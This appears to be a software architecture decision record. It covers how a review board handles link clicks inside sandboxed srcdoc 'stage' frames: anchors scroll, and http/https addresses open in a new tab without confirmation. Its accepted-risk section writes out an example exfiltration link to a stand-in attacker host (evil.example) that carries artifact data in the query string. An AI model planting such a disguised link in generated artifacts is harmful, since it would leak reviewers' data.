# 113. A stage link is handled by the board, and an outbound address opens at once

2026-09-10 · relates to 95, 59

**Context:** a stage is a `srcdoc` frame whose relative links resolve against the board page's address, so every click inside it, an in-page `#anchor` included, becomes a frame navigation the CSP (`default-src 'none'`) refuses; the sandbox also forbids popups, and any message channel that opens URLs is the one outbound path a stage would have. **Decision:** the board's injected stage script owns link clicks: an in-page anchor scrolls inside the frame (below the header band, and never while comment mode is on); an http or https address is posted to the board page, which validates it (parsed by `new URL`, http or https only, from a genuine stage frame only) and opens it in a new tab with `noopener`, at once. The reviewer's click inside the frame is the user activation the popup blocker looks for. **Consequences:** sandbox and CSP stay as 95 left them; an outbound link costs one click and no confirmation; other schemes open nothing. Accepted risk: an artifact's script can dress `https://evil.example/?d=<what the artifact carries>` as an ordinary link and have it open on that click, unread, and the board takes it because the artifacts it shows are the ones its own agent authored. A strip showing the address in the board's chrome with Open and Dismiss was built and reverted for that reason; what it cost was a second click per link.
